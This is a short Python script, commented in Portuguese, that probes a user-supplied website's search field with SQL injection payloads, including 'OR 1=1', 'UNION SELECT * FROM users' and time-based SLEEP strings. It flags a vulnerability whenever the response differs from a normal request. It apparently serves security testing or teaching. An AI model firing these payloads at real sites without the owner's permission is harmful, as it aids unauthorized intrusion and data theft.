import requests
import logging

# Configurando os parametros de logging, utilizando logging para mostrar as etapas do processo a deixar mais dinâmico
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

#função que utilizamos para realizar o scan
def sql_injection_scan(url, search_field, payload):
    logging.info(f"Sending normal request to {url} with search field '{search_field}' and value 'test'")
    normal_response = requests.get(url, params={search_field: 'test'})
    logging.info(f"Received response with status code {normal_response.status_code}")

    logging.info(f"Sending request with SQL injection payload: {payload}")
    malicious_response = requests.get(url, params={search_field: payload})
    logging.info(f"Received response with status code {malicious_response.status_code}")

    if normal_response.text != malicious_response.text:
        logging.warning("Potential SQL injection vulnerability detected!")
        return True
    else:
        logging.info("No SQL injection vulnerability detected.")
        return False

def main():
    url = input("Enter the URL of the website: ")
    search_field = input("Enter the name of the search field: ")

    payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a' --",
        "' UNION SELECT * FROM users --",
        "' AND SLEEP(5) --",
        "' OR SLEEP(5) --"
    ]

    for payload in payloads:
        logging.info(f"Testing payload: {payload}")
        if sql_injection_scan(url, search_field, payload):
            logging.warning("Vulnerability detected! Stopping scan.")
            break

if __name__ == "__main__":
    main()